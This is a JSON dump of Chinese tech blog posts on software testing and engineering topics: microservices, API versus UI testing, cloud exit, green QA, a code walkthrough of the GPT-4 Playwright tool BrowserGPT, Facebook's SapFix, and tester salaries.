微服务有其存在的意义，特别是可伸缩架构带来的灵活性和诱惑力确实会让人欲罢不能。对于大团队来说微服务可能会利大于弊，不过对于小团队来说，微服务引入的复杂性可能难以克服，也许单体服务是更好的选择。\n没有最好的架构，只有适合自己的架构。\n下云和服务单体化在当前可能有节约成本的意义，但这些操作并不一定适合所有团队，还是要慎重对待。\n微服务将逻辑边界（代码编写方式）与物理边界（代码部署方式）混为一谈，当你写代码很难服务部署也很痛苦的时候，可以把这句话再三琢磨一下。\n","date":"2023-11-16T15:35:38+08:00","permalink":"zh.ethanhan.cc/p/%E9%80%83%E7%A6%BB%E5%BE%AE%E6%9C%8D%E5%8A%A1%E4%B8%BA%E4%BB%80%E4%B9%88%E7%8E%B0%E5%9C%A8%E5%A4%A7%E5%AE%B6%E5%8F%88%E5%9C%A8%E8%AE%A8%E8%AE%BA%E5%BE%AE%E6%9C%8D%E5%8A%A1/","title":"逃离微服务？为什么现在大家又在讨论微服务"},{"content":"翻译了一篇Limitations of API-only testing: Why it shouldn’t be your sole testing strategy，这篇文章的核心观点是讨论为什么不能只做api级的测试，挺有道理的，适合泛读以及扩充观点库。\n前几天我收到了一篇独特的文章，它提出了一个大胆的观点：“API测试比UI测试更好”。在软件世界中，像“A比B更好”这样的绝对陈述很少成立。“这取决于”才是大多数技术问题的答案，因为有原因。\n让我们比较API和UI测试，并讨论为什么一个不如另一个。这两个方法是“敌人还是朋友”，但永远是不同的。这很好。\nAPI测试和UI测试——两种截然不同的挑战 当你比较API和UI测试并说一个更好时，这句话背后是什么？人们经常比较这两种测试方法的可扩展性、稳定性或可维护性。然而，这些比较都没有价值，因为API和UI测试非常不同。\n根据我的经验，这些比较的基础总是相同的：API测试比UI测试更容易维护。让我们深入研究一下，看看为什么这并不重要！\nAPI测试易于实现 API测试比UI测试更容易维护的说法是成立的。在最简单的形式中，你甚至可以用你喜欢的编程语言编写一个50行的脚本，对本地或暂存环境进行HTTP调用，并解析JSON来评估响应是否正确。使用HTTP并不难。你甚至可以使用一些shell魔法来连接请求并将脚本并行化，以单个命令覆盖整个API表面。\n很快，你会意识到你需要测试报告、合适的测试运行器和高级测试断言。此外，没有人知道如何处理你自制的测试脚本。因此，你将转向Postman或类似的工具。恭喜你！现在，你可以创建HTTP请求并测试整个API表面。而且可以扩展！这很棒！\n我可以大胆地说，用于验证API的测试工具今天已经足够好了。API测试的复杂性有限，实现是一个已经解决的问题。\n那么，UI测试呢？\nUI测试仍然难以编写和维护 无论使用什么工具，测试Web UI都是具有挑战性的。主要原因是测试网站的复杂性远高于测试API。\n即使是微软的Playwright等现代浏览器自动化工具也通过出色的DX（开发人员体验）、跨浏览器测试功能和用户优先自动化的全新方法简化了UI测试，但Web UI测试仍然是一头难以驯服的野兽。为什么？\n首先，控制浏览器打开页面并评估渲染的UI比进行HTTP调用复杂得多。你知道如何进行脚本化的HTTP请求吗？很可能你会的。你知道如何不使用自动化库来控制浏览器和验证渲染的页面吗？我不会。但是，自动化浏览器并不是UI测试中的唯一问题。\n在过去十年中，现代前端应用程序的技术复杂性已经无限增长。你还记得前端由简单的HTML和一些jQuery代码组成的时候吗？测试HTML GET请求和随后的表单提交POST请求非常简单，因为UI交互是可预测且复杂性有限的。\n如今，一个网站包含2MB以上的压缩资源，每次页面加载会发出60多个请求。平均而言，至少有20个请求是JavaScript资源，它们添加了自定义功能。一个简单的注册表单很容易在竞争中对应用程序进行一系列额外请求，以迫使其进入不同的状态，并添加表单验证、动画或控件。希望没有脚本会卡住卡，否则应用程序可能会进入白屏甚至是无法正确渲染。\n简而言之，在现代Web应用程序中发生了很多事情，无论使用什么工具，测试现代Web都很难。很遗憾地告诉您：这不会很快改变。无论使用什么工具。\n但这也意味着你应该为了易用性而选择API而不是UI测试吗？绝对不是！\n您想通过测试策略解决什么问题？ 将测试方法相互比较是错误的，因为每个产品都是不同的。每个应用程序都有不同的要求、为不同的客户提供服务，并使用不同的技术构建。没有单一的最佳测试方法——这总是取决于具体情况。软件开发和测试总是关于权衡取舍。\n您的测试设置应该围绕一个问题展开：为什么要投资于自动化测试？您想从中得到什么？对这个问题的回答（而不是其他任何东西）将导致适合您的测试设置。\n如果您正在开发面向开发人员的产品，那么您很可能提供 HTTP API。您是否应该测试其 endpoint？当然！您是否应该追求 100% 的测试覆盖率？只有您才能回答这个问题，因为编写和维护测试需要时间和精力。但是，如果您努力保持高可用性或与反复出现的 API 错误作斗争，那么良好的测试覆盖率不会对您造成任何损害。\n但假设您的核心产品是基于定制 API 的用户界面。即使底层 API 正常运行，您的应用程序是否也可能崩溃？当然！前端代码中一个简单的分号缺失就可能使您的应用程序瘫痪。更不用说前端逻辑错误了。在这种情况下，承担 UI 测试的负担是否值得？我会说是的！\n要编写哪些测试以及要测试哪些功能取决于您和您的产品。哪些功能不能被破坏？测试这些功能应该是最低要求。\n高测试覆盖率错过重点 高测试覆盖率（无论是 API 还是 UI）如果不能防止您将关键的用户端错误发布到生产环境，那么它就失去了意义。如果您因为 API 测试“更好”而严格测试 API 表面，那就太好了！拥有测试仍然比没有测试好。\n但是，如果您的测试套件未能使您尽快发布无 bug 软件，那么您必须质疑测试的目的。您是否在为自己进行测试？您是否在追求虚荣的数字，而不是使您能够向生产环境发布好东西？我多次犯过追求神圣但毫无意义的 100% 测试覆盖率的错误。\n但你应该测试什么，平衡点在哪里？\n自动化测试完全是关于用户体验的（并且永远都是） 我是否在说您不应该追求高测试覆盖率？一点也不。相反，我主张采用以用户和价值为导向的测试方法。您的客户都不在乎您的高测试覆盖率。他们唯一关心的是一个工作正常的产品。\n如果您的 API 测试使您能够快速发布新功能并且不会破坏生产环境，那就去做吧。但如果您的测试套件存在盲点，您的应用程序可能会在您不知不觉的情况下崩溃，那么您最好消除这些盲点！\n确实，UI 测试很难编写，因为它们处理的是高复杂性，但如果您为客户提供 UI，那么您至少应该知道它可以工作！不要让一个缺失的分号击倒你。而且，您是否需要测试所有 UI 功能并追求神圣的测试覆盖率？当然不是，但知道您上次的功能部署没有破坏关键的用户流程会让您睡得更好。相信我。\n由您来定义需要多少测试才能自信地发布功能并赢得用户信任。\n但说到信任，您的 API 和 UI 部署测试是否真的能防止您出现用户端的生产问题？我对此表示怀疑。\n部署测试不是您所希望的安全网\n假设您正在发布一个为全球受众提供服务的应用程序并依赖第三方 API。测试您的部署是否足以确保出色的用户体验？如果您的 API 依赖项之一宕机怎么办？您的应用程序是否会跟随？\n如果答案是“是”，请注意部署测试可能无法满足要求，因为您的应用程序在生产部署后可能会（并且将会）崩溃。\n我现在是将话题从测试切换到监控了吗？是也不是。\n从历史上看，测试和监控是两种截然不同的学科。开发人员、测试人员和 QA 工程师关心的是孤立的工作功能。另一方面，平台和网站可靠性工程师关心的是一个工作正常且性能良好的生产环境。\n不幸的是，直到今天，这些团队独立工作的现象也很常见。开发人员将新功能抛给基础架构人员，让他们想办法让它们继续运行。但为什么呢？\n首先，是因为这些团队依赖于不同的工具。当测试和监控工具不同时，您应该如何协作？这对各方都具有挑战性，会减慢开发速度并阻碍协作。\n正如解决方案工程师 Jonathan Canales 所描述的解决方案，一个统一的工具链可以实现快速迭代、高效测试和无缝监控。阿门！\n但是，您如何统一测试和监控，甚至可以将所有测试重新用于合成监控？好吧……您可能应该采用“Monitoring as Code”。它使您可以测试部署，然后将测试重新用于 24/7 全球监控。这种方法确保您的用户在使用您的产品时获得愉快的体验。如果他们没有，您将是第一个了解生产问题的人。\n结论 那么，现在是 API 测试更好还是 UI 测试更好？令人不快的答案是：都不是。两者都很重要！\n要测试什么（以及何时测试）取决于您自己。您最了解您的产品及其关键任务型功能。只有您知道哪些功能不能被破坏。维护自动化测试可能是一项艰苦的工作，但易于实现并不是决定应该追求什么的衡量标准。\n自动化测试不是关于您或使其工作所需的精力。自动化测试是关于在不破坏事物的情况下发布伟大功能。它是关于让您的客户满意 - 这才是最重要的。\n","date":"2023-11-10T10:15:38+08:00","permalink":"zh.ethanhan.cc/p/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E4%B8%8D%E8%83%BD%E5%8F%AA%E5%81%9Aapi%E6%B5%8B%E8%AF%95/","title":"为什么你不能只做api测试"},{"content":"之前ruby on rails 的创始人dhh在twitter上宣布由于云服务的价格过于昂贵，他们决定自己买服务器自建服务以节约成本。在今年9月15号的Our cloud exit has already yielded $1m/year in savings这篇博客中,dhh 宣布他们公司37 signals目前云服务的月花费从18万美金降到了8万美金，也就是1年可以节约100万美金。10月27号，twitter也宣布他们的去云化项目为公司降低了60%的成本。在这之后关于去云化的讨论逐渐热门起来，目前看来一些公司确实在认真思考从云端逃离的可能性。\n为什么大家都在逃离云服务 我觉得核心问题还是全球经济衰退，除了裁员节省成本之外，少用或者甚至不用云服务可以带来可观的成本降低。讽刺的是当初云服务的兴起就跟成本节约相关，如今屠龙的少年却成了恶龙，在被人们慢慢抛弃。\n在很多年前，互联网应用运维难度大，机器带宽等成本相对较高，资源整合型的云服务可以显著为小型团队节约成本，降低了构建产品的门槛。但这么多年过去了，硬件成本逐步走低，而云服务的定价却变化不大，高溢价就降低了云服务的性价比，从而会影响大家的理性选择。\n初创企业往往是云服务利润的贡献者，这几年大量的初创企业倒闭导致云服务商失去了一大块利润来源，这也在一定程度上降低了云服务厂商降价的积极性。\n简单来说云服务的存量用户嫌贵，增量用户变少，因此整个市场就显得萧条。\n我们是否真的需要云服务 对于大公司来说，云服务确实是必须的，因为规模化带来的巨大成本优势是非常有吸引力的。比如大公司扩张的过程中可以不需要去某些海外市场建机房攒带宽，直接买云服务就可以了，这些服务对于大公司业务来说是一个积极的补充，因此大公司对云的使用其实是混合云为主，自建机房加上云服务辅助，这样就可以尽可能的降低边际成本。\n对于初创公司来说，用云服务其实是最快产品化的选择，很多时候如果你拿了投资人的钱的话，你是没得选的，必须上云，然后快速进行产品迭代。如果你产品的最初版本就在云端运行而且运行的很好，那么你是没有动力去买服务器然后托管的。不过随着业务的发展，从成本角度考虑，把服务从纯云端切回混合部署的方式可能会是一个不错的选择，首先可以降低成本，其次可以把核心的数据资产攥在自己手上，从经济上和安全性上考量，混合云的方式都有存在的价值。\n所以我认为云服务是必须的，这是一种资源整合带来的规模化优势的体现，很多场景下确实可以降低成本，但完全依赖云服务则不一定可取。\n云服务的未来会怎么样 既然大家都在逃离，那么是不是云服务和云计算的前景就变得暗淡了呢？\n不一定，我觉得云服务可能跟经济一样有其周期性，如果云服务持续的改进和创新，那么这个周期性可能就会显得很明显。比如经济好的时候，大家都选择创业，大公司选择开拓市场，那么云服务厂商会跟着一同繁荣。但如果经济下行，创业潮过去，大公司选择降本增效，那么云服务自然就会受到冷遇。\n云服务的本质决定了这是一种相对来说高效的做法，理论上讲长远看还是有市场的，不过云服务还是需要逐步演进的，比如为解决气候变化问题逐步淘汰低能效的机器，使用清洁能源来替换化石能源等。\n逃离可能只是经济发展放缓带来的暂时性问题，一旦云服务迭代跟上了，降低了成本和定价，提升了服务的稳定性，流失的用户是有回归的可能性的。\n","date":"2023-10-31T10:22:45+08:00","permalink":"zh.ethanhan.cc/p/%E9%80%83%E7%A6%BB%E4%BA%91%E6%9C%8D%E5%8A%A1%E4%B8%BA%E4%BB%80%E4%B9%88%E5%A4%A7%E5%AE%B6%E5%9C%A8%E8%AE%A8%E8%AE%BA%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8%E4%BA%91%E6%9C%8D%E5%8A%A1/","title":"逃离云服务？为什么大家在讨论避免使用云服务"},{"content":"最近看到一篇文章是关于软件测试与节能减排的讨论的，可持续发展这个观点在西方国家目前经常被拿出来探讨，因为这与气候变化等的人类世问题关系非常密切。把这篇可持续软件测试：为更绿色和更高效的未来制定 5 项策略 简单翻译了一下，里面还是有很多中肯的建议的，一些看法其实与效能提升关系密切，毕竟效率提高了，消耗和浪费可能会有所减少。\n背景 在技术进步与进步同义的时代，软件开发的生态足迹往往被忽视。\nShiftProject的一项研究估计，2018年信息和通信技术(ICT)行业的碳足迹约占全球温室气体排放的2-3%。 彭博社预测，到2030年，IT系统将占全球能源需求的惊人20%。从这个角度来看，交通运输业目前占全球能源消耗的25%。 根据国际能源署(IEA)的数据，2018年数据中心在全球消耗了约200太瓦时(TWh)的电力。 绿色软件开发的出现宛如灯塔，提供了一种转向生态友好实践的范式转变，与全球对可持续发展的迫切呼吁一致。这种方法不仅仅是一个流行语，它呼吁在软件生命周期中致力于资源效率、减少能源消耗和全面考虑环境。\n通过优化软件测试流程中的资源利用和能源需求，组织可以降低整体测试成本。对于大型测试项目来说，这可以节省大量的资金。此外，测试过程变得更加高效和流线化，从而实现更快的交付周期和更短的上市时间。\n目标很简单：优化测试策略和自动化实践，以节省资源，从而节省能源。\n以下是 5 项策略，可立即在您的组织中启动“绿色 QA”。\n1. 使所有测试执行“上下文相关” 仅执行与代码更改相关的测试。避免盲目执行；不要在每个环境上运行每个测试。避免大批量的测试执行。这将减少资源消耗并最大限度地减少能源使用。 避免像晚上、一天多次等计划执行。这些执行会消耗太多资源，如果自上次执行以来部署的代码没有变化，则可能不会提供任何价值。 将测试隔离，确保每个测试套件或测试用例在不影响其他测试套件或测试用例的情况下独立运行。这可以防止资源争用并提高并行执行的整体效率。减少测试间依赖，以便更容易地在不等待其他测试完成的情况下并发执行测试。 利用云平台进行测试执行，因为它们可以根据需要动态分配资源。这可以为能源效率做出重大贡献。 重新设计 CI 和 CD pipeline，以在各种“测试”阶段结合上述原则。 可以通过转向 Trunk-based 开发和使用注释在代码中标记测试并将其作为参数传递给 CI/CD pipeline来实现。\n2. 实施节能的测试自动化 (编码) 实践 测试执行能耗 = 活动代码能耗 + 等待代码能耗 + 空闲代码能耗\n将测试自动化框架和脚本容器化。容器提供了一个轻量级且孤立的环境，使其易于水平扩展。它们还减少了每次代码下载和构建过程生成的网络流量。 最小化文件 I/O 操作，尤其是在循环或频繁文件访问场景中。使用缓冲 I/O 操作来减少磁盘访问次数。例如：从文件中读取测试数据或从文件中读取配置或将结果推送到测试管理工具。 学习编写优化的代码，包括死代码消除、循环优化、公共子表达式消除等。此外，分析不同算法的性能特征并为您的特定用例选择最合适的算法。 保持测试工具和库是最新的，以受益于任何性能改进。 在代码中及时释放资源，尤其是在资源受限的环境中，如移动设备或物联网设备测试。 最小化后台进程、任务和线程，这些进程、任务和线程可能会提高 CPU 和内存利用率，从而增加功耗。 调整日志记录和报告的详细程度，以避免不必要的资源消耗。 可以通过在自动化指南文档中记录所有上述内容、与质量工程师沟通并在代码审查过程中将它们作为检查领域来实现。\n3. 优化测试环境 建立明确的测试到环境映射（定义哪些测试应该在哪些环境上运行及其节拍），以避免冗余和重叠的测试执行。 每个环境都应从测试的角度发挥独特的作用。不要在所有地方测试所有内容。 实施动态资源分配，根据当前的测试需求分配资源。例如，运行负载测试的资源需求将与运行 API 测试的资源需求非常不同。 在使用后拆除测试环境。例如，启动一个动态环境，部署版本，运行测试，记录证据，然后将其拆除。 利用为效率和可扩展性而设计的基于云的测试服务。云平台通常会优化资源使用，比传统基础设施更节能。 考虑实际需要的环境数量。您是否真的需要 2 或 3 个环境？有什么理由？如今，许多组织正在转向单一环境策略。 可以通过有意识地与 SRE 团队共同设计环境配置（考虑到测试需求）并在合规性测试中引入可持续性检查来实现。\n4. 在 QA 中设定可持续性 OKR 以下是一些示例 OKR：\n目标 1：提高软件测试执行效率\n关键成果 1：通过优化代码和基础设施，将测试执行的总体能耗降低 20%。 关键成果 2：实施一种在测试执行过程中监控和报告能耗的方法，提供对环境影响的可见性。 关键成果 3：进行审核并识别至少三个可以提高能效的领域。 目标 2：在测试执行过程中最小化资源利用\n关键成果 1：通过采用容器化和高效的资源分配，将服务器资源使用量减少 15%。 关键成果 2：实施一个自动化系统来实时跟踪和管理资源消耗。 关键成果 3：评估和采用对环境友好的测试工具提供商或服务，考虑可再生能源的使用和资源效率。 目标 3：推广可持续测试实践\n关键成果 1：对所有测试团队成员进行可持续编码实践和节能算法重要性的培训。 关键成果 2：将可持续性考虑纳入代码审查流程，目标是捕捉和解决至少 80% 的能源效率低下的代码。 关键成果 3：实施奖励制度，表彰和奖励那些始终如一地为可持续编码实践做出贡献的开发人员。 目标 4：提高利益相关者意识\n关键成果 1：制定并启动针对内部和外部利益相关者的意识活动，强调可持续性的重要性。 关键成果 2：发布可持续性报告，详细说明测试对环境的影响以及为缓解影响而采取的措施。 关键成果 3：与至少三个外部组织或合作伙伴合作，开展软件开发中的可持续性举措。 可以通过采用资源监控工具和能源监控工具来实现。从市场上提供的多种选项中选择最适合您的选项。\n5. 营造节能文化 教育工程师和团队有关可持续性和绿色软件开发实践及其必要性。 倡导缺陷预防文化。使用测试金字塔、左移和其他现代质量工程实践的原则，确保尽早发现缺陷。每个缺陷都有一个开发成本和一个环境成本来修复。 将绿色 QA 指南和标准包括在测试策略文档中。 在您的开发团队中营造节能编码实践的传统。定期进行回顾和回顾，以识别改进开发过程中可持续性的机会。 建立一个知识共享和可持续发展实践合作的论坛。 在团队中创建“可持续发展冠军”——他们是可持续发展领域的专家和旗手，可以教育和指导他人。 表彰和奖励始终如一地致力于可持续测试自动化开发的团队。 ","date":"2023-10-25T10:53:38+08:00","permalink":"zh.ethanhan.cc/p/%E5%8F%AF%E6%8C%81%E7%BB%AD%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B8%BA%E6%9B%B4%E7%BB%BF%E8%89%B2%E5%92%8C%E6%9B%B4%E9%AB%98%E6%95%88%E7%9A%84%E6%9C%AA%E6%9D%A5%E5%88%B6%E5%AE%9A-5-%E9%A1%B9%E7%AD%96%E7%95%A5/","title":"可持续软件测试：为更绿色和更高效的未来制定 5 项策略"},{"content":"之前介绍过一个使用 chatgpt4 分析 dom，然后生成 puppeteer 代码进行自动化的测试工具 Taxy AI。今天发现有人推荐了一个使用 chatgpt4 生成 playwright 代码的测试工具BrowserGPT，稍微看了一下，原理比较简单，比较适合我们去研究一下，顺便打开思路。\n演示动画 具体使用 因为我没有 chatgpt4 的 key，所以没办法直接上手使用，只能通过文档去猜测一下具体用法。\nBrowserGPT 设置了 openai 的 key 以及 start url 之后就可以在命令行里运行了，大致的使用方式是输入一些自然语言，然后 BrowserGPT 执行 AI 生成的 playwright 代码，实现自然语言自动化的功能。\n1 2 go to hn click on the abc article 比如上面的一些描述就实现了去 hacknews 网站点击 abc 这篇文章的功能。\n原理分析 大致看了一下，执行的流程是这样的，代码在这里\n获取初始化的 url，打开 chrome 浏览器，跳转到这个 url 在命令行里启动 prompt，也就是给用户一个输入的 ui 初始化 openai 的 api 写个死循环，每次用户输入之后调用doAction函数 在doAction函数里简化当前页面的 dom 元素 将简化过的 dom 元素传给 chatgpt，让 gpt 根据 playwright 的示例生成代码 执行 chatgpt 生成的代码 这里最有意思的部分是doAction函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 async function doAction(chatApi, page, task, options = {}) { const systemPrompt = ` You are a programmer and your job is to write code. You are working on a playwright file. You will write the commands necessary to execute the given input. Context: Your computer is a mac. Cmd is the meta key, META. You are on the website ${page.evaluate(\u0026#34;location.href\u0026#34;)} Here is the overview of the site ${await parseSite(page, options)} Your output should just be the code that is valid for PlayWright page api. When given the option to use a timeout option, use 1s. Except when using page.goto() use 10s. For actions like click, use the force option to click on hidden elements. User: click on show hn link Assistant: \\`\\`\\` const articleByText = \u0026#39;Show HN\u0026#39;; await page.getByText(articleByText, { exact: true }).click(articleByText, {force: true, hidden: true}); \\`\\`\\` `; let code = \u0026#34;\u0026#34;; try { code = await queryGPT(chatApi, [ new SystemChatMessage(systemPrompt), new HumanChatMessage(task), ]); } catch (e) { console.log(e.response.data.error); } try { const func = AsyncFunction(\u0026#34;page\u0026#34;, code); await func(page); } catch (e) { console.log(e); } } 可以看到给 chatgpt 的提示词是两个部分合成的，一个是预先定义的，另一个是用户输入的指令。\n简单分析一下系统的提示词，大概分这几个部分\n角色和任务定义: You are a programmer and your job is to write code. You are working on a playwright file. You will write the commands necessary to execute the given input.，让 chatgpt 去扮演程序员， 环境描述: Your computer is a mac. Cmd is the meta key, META.，运行环境是 mac 提供主要信息: Here is the overview of the site;${await parseSite(page, options)}，这里把当前页面的 html 元素的 body 简化了一下，再喂给了 AI 提供示例: 最后提供一个示例，让 ai 按照例子生成代码，并且让 ai 不要废话，只需要生成代码就好了 一句话描述就是把当前的网页的 html 减肥一下，把页面的 dom 和用户的命令传给 ai，让 ai 生成 playwright 代码，最后执行 ai 生成的代码。\n泛化 泛化一下，使用 ai 进行一些测试工具的设计我们可以有下面的一些尝试\n压缩信息。把页面/api 的描述用尽量简化的方式描述出来，作为输入的一部分喂给 ai，尽量不要基于 ai 自身的先验（也就是学习过的）知识来进行任务的执行，这样可能会产生幻觉 定义好的提示词。一般来说好的提示词包含：角色定义，任务描述，示例以及规范的输出描述 利用 ai 生成代码或其他文本（比如手工测试用例） 利用执行 ai 的生成的代码或者保存 ai 生成的内容 其实按道理来说还应该使用 ai 去检查之前的生成的代码或内容，让 ai 提供改进方案或者建议，这样输出的代码可能准确性会更高，不过忽略掉这个步骤问题也不大。更泛化一点看，其实这个工具有点简单的 ai agent 的样子，把 agent 与测试结合起来应该是未来一个不错的尝试方向。\n可能会遇到的问题 这个工具目前看来实用性是有限的，这是因为当前时间节点，也就是 2023 年 10 月份，ai 可能会存在下面的问题\n输出不稳定。同样的提示词可能每次生成的代码是不稳定的，不过之前看到 openai 的 dalle 3 提示词洋洋千言似乎每次得到的结果都很稳定，估计后面的模型在输出稳定性上会有极大的提升，另外好的提示词也能提升输出的稳定性； 无法生成最新 api 的代码。playwright 的 api 变化很快，我记得半年前写的一些代码现在就可能跑不起来了，不过因为 gpt4 的训练内容并不是最新的，所以生成的代码可能是基于旧的 api，有点鸡肋。不过如果是生成 selenium 的代码的话可能实用性会更强一点，毕竟 se 的主要接口这些年都没怎么变过； 最后大家可以头脑风暴一下，除了让 ai 把自然语言转成代码进行自动化测试之前，ai 还能在测试领域有什么样的应用呢？\n","date":"2023-10-19T17:17:24+08:00","permalink":"zh.ethanhan.cc/p/ai%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8E%A2%E7%B4%A2%E4%B9%8Bgpt4%E4%B8%8Eplaywright/","title":"AI自动化探索之gpt4与playwright"},{"content":"最近Facebook的工程师们撰写了一份文档，解释了他们如何编写了一个可以自动修复bug的工具。在这篇论文中，他们介绍了𝗦𝗔𝗣𝗙𝗜𝗫，这是一个自动检测和修复软件bug的工具。该工具对Facebook App Family中的六个重要安卓应用程序提供了修复建议，这些应用程序包括Facebook、Messenger、Instagram、FBLite、Workplace和Workchat。\n工作原理 步骤1：检测崩溃 - 另一个名为𝗦𝗮𝗽𝗶𝗲𝗻𝘇的工具用于查找应用程序崩溃情况。当Sapienz识别出崩溃时，它会被记录到数据库中。\n步骤2：确定问题 - SAPFIX可以准确定位导致问题的代码行。它首先检查崩溃是否可重现。如果不可重现，崩溃将被丢弃。它使用一种称为\u0026quot;基于频谱的错误定位\u0026quot;的技术来确定最可能导致崩溃的代码行。\n步骤3：提供修复建议 - 使用预定义的模板或代码变异，SAPFIX提出了一个解决方案。在确定故障位置后，SAPFIX尝试生成一个补丁。它采用了以下两种策略：\n基于模板的修复 - SAPFIX使用预定义的模板为常见bug提供修复建议。这些模板是根据标准开发者实践设计的。 基于变异的修复 - 如果基于模板的方法失败，SAPFIX将采用基于变异的系统。它会对故障位置应用一系列代码变异，生成潜在的修复方案。 步骤4：测试修复 - 提议的解决方案会经过测试以确保其有效性。它使用𝗦𝗮𝗽𝗶𝗲𝗻𝘇的测试用例来检查补丁的有效性。如果补丁通过所有测试，则被视为有效的修复方案。在补丁验证完成后，SAPFIX使用𝗜𝗻𝗳𝗲𝗿（一种静态分析工具）对提议的修复方案进行进一步分析。Infer会检查补丁是否引入了任何新的潜在问题。\n步骤5：审查 - 开发人员拥有最终决定权，对修复方案进行审查和批准。\n论文地址是: https://ieeexplore.ieee.org/document/8804442\n","date":"2023-10-11T14:44:02+08:00","permalink":"zh.ethanhan.cc/p/faceboook%E5%88%9B%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E4%BF%AE%E5%A4%8Dbug%E7%9A%84%E5%B7%A5%E5%85%B7/","title":"Faceboook创建了一个可以自动修复bug的工具 "},{"content":"很少看到有讨论测试人员薪资的文章，当然了在一些论坛里这个话题似乎是主旋律，经久不衰。但写小作文去讨论这件事的测试人员还是不多的。今天看到一篇名为Want to Increase Your Salary as a Tester? Look for a New Job的文章，说的很实在，国内国外都适用，翻译一下，供大家参考。\n我们大多数人都不介意获得加薪,尤其是考虑到通货膨胀如何影响世界大部分地区。一切似乎都在变得越来越贵,我们的购买力似乎每周都在萎缩。大多数公司每年都会进行渐进式的加薪,但这仍无法跟上现实生活中的开支。这些略微的加薪也难以反映出你全年的改进。\n你想要的加薪应当与你创造的价值和职业发展成正比。但是你该如何获得与你当前技能水平相称的加薪呢?你可以尝试改进现有技能以获得QA经理的晋升,或者从手工测试转向自动化测试。不幸的是,有些工作环境没有职位或能力来晋升任何人。有些公司根本不会从内部晋升任何人。无论你付出多少努力,这些决定都不在你的控制范围内。\n无论你是在公司工作了一两年的手工测试人员,还是拥有丰富经验的软件开发测试工程师,获得加薪的最佳方式是找到一份新工作。\n作为测试人员跳槽可以获得回报 证据表明,与留在原职位获得的平均加薪相比,跳槽可以带来更高的工资增长。在一份报告中,工资和人力资源巨头ADP在2021年收集了1800万工人的数据,并指出换工作的人工资增长了5.8%,而保留工作的工人只增长了3.1%。在日本,人力资源公司Recruit今年也得到了同样的结论:换工作的人工资增加了3%,而留在原地的人只增加了1.2%。\n你或者你认识的人可能都有过有意跳槽获得大幅加薪的经历。我的个人经历也印证了这一点,包括我从一家公司跳槽到另一家公司时,工资增加了50%(后来由于内部晋升又增加了33%)。仅仅通过跳槽到一家新公司就将薪水翻倍的故事并不罕见。\n基本工资的大幅增加不是跳槽带来的唯一好处。你还应该考虑到与新角色相关的额外福利,比如灵活的工作时间、远程工作的能力和更多的假期时间。根据你所在的国家和组织,这些额外福利可以有很大差异。例如,硅谷的一家创业公司可能会在加薪的基础上提供股权。这许多因素不会直接影响你获得的金钱数额,但从长远来看可以极大地提高职业满意度。\n跳槽时金钱并非唯一考量 当然,这不全是关于加薪。我们都需要金钱,但有时仅仅为了短期内的加薪而损害你的长期职业发展是不明智的。你需要看得更长远,确保你正在做出正确的决定来增加你未来多年的挣钱能力。对于职业生涯还在早期的测试人员来说,这一步尤其值得注意。\n密切关注你当前角色以及未来职位中的潜在停滞是很重要的。在我职业生涯早期,我离开了一份工作,却进入了另一份工作内容几乎相同的角色。说实话,这导致了停滞和懒惰。我最初跳槽时确实多赚了一点钱,但专业发展的缺乏可能使我失去的要比如果我选择能将我带出舒适区的公司所能获得的要多得多。\n当寻找新工作时,你需要探索的主要领域之一是拓展技能的能力。作为一名软件测试人员,你可能已经适应了当前角色中使用的某些工具和遵循的特定流程。找到可以让你接触新方法和新技术的不同职位将大大提高你在QA中的价值,并直接影响你未来测试职业生涯的挣钱能力。\n在充满不确定性的时期找到测试工作 如今,似乎大多数大型和小型科技公司每周都在裁员。仅2022年,像谷歌、Meta和亚马逊这样的行业巨头就解雇了数万名员工。许多这些公司也暂停了招聘,因此我们现在有更少的选择来寻找新工作。由于市场上涌入大量优秀的被裁员工,任何可用职位的竞争可能也会变得更加激烈。\n仅仅发送一个充满时髦词汇的简历并期待接到电话已经不够了。你必须展示你的技能、经验和成为专业QA的渴望。在LinkedIn或Ministry of Testing论坛等地方扩大你的专业网络可以开启新的机会之门。写博客和上传视频是展示你知识并展现你对行业热情的绝佳方式。有许多不同的方式可以使你脱颖而出,许多有价值的公司看重这种主动性。\n尽管我们目前似乎处于低迷期,但情况并非大多数主要出版物所描述的那么令人绝望。如果你仔细寻找,你仍会发现许多受人尊敬和有趣的组织在寻找像你这样高技能测试人员加入他们的团队。当然,找到这些职位现在比以前更具挑战性,你可能会收到无数拒绝或“鬼影”。我知道这对心理是一个大负担。但这并非不可能克服。低迷期是暂时的,在跳槽之前,你可以开始为更光明的未来做准备。\n总结 在同一家公司工作几十年直到退休的日子早已一去不复返了。大多数现代公司都知道这一点,但暗自希望你尽管缺乏经济和非经济激励但还是继续留下来。作为一名软件测试人员,主导你的职业和财务未来取决于你自己。寻找一份新工作可能是实现这些目标的最佳策略。\n离开当前角色去别处找到一份新工作通常伴随着比等待可能永远不会到来的潜在加薪更高的加薪。你还可能获得更灵活的工作环境等额外福利,这可能极大地改善你的工作与生活平衡。除了金钱之外,新角色还带来了新职责,为你未来带来更大的发展机会。\n这篇文章并不是说每个读者都需要尽快找到一份新工作。你可能对当前的团队、薪水和职责感到满意。如果是这样,请珍惜你拥有的一切。但是许多人会从一个新环境中受益,无论是为了金钱还是职业发展。目前的求职市场有些紧张,但请开始把自己放在那里——你永远不知道能发现什么。走出舒适区是成为更好测试人员的绝佳方式。\n","date":"2023-09-27T16:38:03+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E6%83%B3%E6%B6%A8%E8%96%AA%E6%8D%A2%E4%BB%BD%E6%96%B0%E5%B7%A5%E4%BD%9C%E5%90%A7/","title":"测试人员想涨薪？换份新工作吧"},{"content":"很少看到有人讨论预发布环境的问题。今天正好看到一篇文章The Importance Of Testing In A Reliable Staging 